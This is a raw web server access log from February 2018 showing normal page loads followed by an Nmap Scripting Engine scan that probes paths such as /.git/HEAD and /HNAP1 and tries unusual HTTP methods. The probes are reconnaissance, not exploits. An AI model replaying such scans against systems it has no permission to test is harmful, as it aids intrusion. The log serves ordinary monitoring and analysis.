34.229.17.233 - - [06/Feb/2018:22:06:33 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (Windows NT 6.2;en-US) AppleWebKit/537.32.36 (KHTML, live Gecko) Chrome/50.0.3037.90 Safari/537.32"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET / HTTP/1.1" 200 217 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET /style.css HTTP/1.1" 200 94 "http://35.196.196.232/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET /sheep.png HTTP/1.1" 200 7564 "http://35.196.196.232/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:08 +0000] "GET /favicon.ico HTTP/1.1" 200 1665 "http://35.196.196.232/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /.git/HEAD HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /robots.txt HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /nmaplowercheck1517954913 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.1" 200 264 "-" "-"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /HNAP1 HTTP/1.1" 404 169 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "PROPFIND / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "ZCJD / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET /favicon.ico HTTP/1.1" 200 1665 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:33 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "GET / HTTP/1.1" 200 264 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "HEAD / HTTP/1.1" 200 0 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "POST / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.62 - - [06/Feb/2018:22:08:34 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "GET / HTTP/1.0" 200 264 "-" "-"
130.64.25.57 - - [06/Feb/2018:22:10:00 +0000] "OPTIONS / HTTP/1.1" 405 173 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
